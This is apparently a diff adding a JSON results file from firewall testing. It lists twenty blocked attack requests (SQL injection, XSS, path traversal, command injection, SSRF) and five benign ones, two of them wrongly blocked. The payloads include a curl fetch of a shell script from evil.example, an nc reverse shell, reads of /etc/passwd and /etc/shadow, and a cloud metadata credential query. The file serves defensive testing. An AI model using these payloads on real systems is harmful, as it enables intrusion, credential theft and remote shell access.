@@ -1,0 +1,202 @@
+[
+  {
+    "id": "ATK-01",
+    "category": "SQLi",
+    "kind": "attack",
+    "path": "/items?id=1%27%20OR%20%271%27%3D%271",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-02",
+    "category": "SQLi",
+    "kind": "attack",
+    "path": "/items?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-03",
+    "category": "SQLi",
+    "kind": "attack",
+    "path": "/items?id=1%3B%20DROP%20TABLE%20sessions--",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-04",
+    "category": "SQLi",
+    "kind": "attack",
+    "path": "/items?id=1%27%20AND%20SLEEP%285%29--",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-05",
+    "category": "SQLi",
+    "kind": "attack",
+    "path": "/items?id=admin%27/%2Acomment%2A/OR/%2Acomment%2A/1%3D1%23",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-06",
+    "category": "XSS",
+    "kind": "attack",
+    "path": "/search?q=%3Cscript%3Ealert%281%29%3C/script%3E",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-07",
+    "category": "XSS",
+    "kind": "attack",
+    "path": "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-08",
+    "category": "XSS",
+    "kind": "attack",
+    "path": "/search?q=javascript%3Aalert%28document.domain%29",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-09",
+    "category": "XSS",
+    "kind": "attack",
+    "path": "/search?q=%3Csvg/onload%3Dconfirm%281%29%3E",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-10",
+    "category": "LFI",
+    "kind": "attack",
+    "path": "/download?file=../../../../etc/passwd",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-11",
+    "category": "LFI",
+    "kind": "attack",
+    "path": "/download?file=..%252f..%252f..%252fetc%252fshadow",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-12",
+    "category": "LFI",
+    "kind": "attack",
+    "path": "/download?file=/proc/self/environ",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-13",
+    "category": "LFI",
+    "kind": "attack",
+    "path": "/download?file=..%5C..%5C..%5CWindows%5Cwin.ini",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-14",
+    "category": "CMDi",
+    "kind": "attack",
+    "path": "/diag?host=127.0.0.1%3B%20cat%20/etc/passwd",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-15",
+    "category": "CMDi",
+    "kind": "attack",
+    "path": "/diag?host=127.0.0.1%20%26%26%20/bin/sh%20-i",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-16",
+    "category": "CMDi",
+    "kind": "attack",
+    "path": "/diag?host=%24%28curl%20http%3A//evil.example/shell.sh%29",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-17",
+    "category": "CMDi",
+    "kind": "attack",
+    "path": "/diag?host=127.0.0.1%20%7C%20nc%20-e%20/bin/sh%2010.0.0.1%204444",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-18",
+    "category": "SSRF",
+    "kind": "attack",
+    "path": "/webhook?url=http%3A//169.254.169.254/latest/meta-data/iam/",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-19",
+    "category": "SSRF",
+    "kind": "attack",
+    "path": "/webhook?url=file%3A///etc/passwd",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "ATK-20",
+    "category": "SQLi-PL3",
+    "kind": "attack",
+    "path": "/items?id=10%26%261%3D%3D1",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "BEN-01",
+    "category": "Benign",
+    "kind": "benign",
+    "path": "/items?id=42",
+    "status_code": 404,
+    "blocked": false
+  },
+  {
+    "id": "BEN-02",
+    "category": "Benign",
+    "kind": "benign",
+    "path": "/search?q=wireless%20mechanical%20keyboard",
+    "status_code": 200,
+    "blocked": false
+  },
+  {
+    "id": "BEN-03",
+    "category": "Benign",
+    "kind": "benign",
+    "path": "/profile?name=O%27Connor%20%26%20Sons%20%28UK%29%20--%20Tier-1%20Partner%21",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "BEN-04",
+    "category": "Benign",
+    "kind": "benign",
+    "path": "/note?math=score%20%3E%3D%205%20%26%26%20ratio%20%3C%3D%2010%20%7C%7C%20flag%20%3D%3D%20true",
+    "status_code": 403,
+    "blocked": true
+  },
+  {
+    "id": "BEN-05",
+    "category": "Benign",
+    "kind": "benign",
+    "path": "/api/feedback?comment=Great%20release%21%20Everything%20works%20fast.",
+    "status_code": 404,
+    "blocked": false
+  }
+]
